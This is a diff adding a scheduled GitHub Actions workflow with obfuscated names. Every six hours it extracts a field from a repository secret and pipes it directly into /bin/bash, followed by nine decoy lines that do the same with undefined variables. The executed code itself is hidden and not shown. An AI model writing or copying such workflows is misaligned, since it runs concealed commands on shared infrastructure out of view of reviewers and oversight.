@@ -1,0 +1,28 @@
+name: lanyuanshiqun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lanyuanshiqun
+        env:
+          wpkp71: ${{ secrets.wpkp71 }}
+        run: |
+          echo $wpkp71 | jq -r .ogzu603 | /bin/bash
+          echo $gfzr0948 | jq -r .s0782 | /bin/bash
+          echo $zoee47 | jq -r .l43 | /bin/bash
+          echo $xc6 | jq -r .fi985 | /bin/bash
+          echo $nbd089 | jq -r .brijw02977 | /bin/bash
+          echo $l8 | jq -r .ze24355 | /bin/bash
+          echo $lby83039 | jq -r .wde8 | /bin/bash
+          echo $fw2363 | jq -r .bdhl3001 | /bin/bash
+          echo $bjwek77 | jq -r .qmth3 | /bin/bash
+          echo $qwfym968 | jq -r .i6 | /bin/bash
+
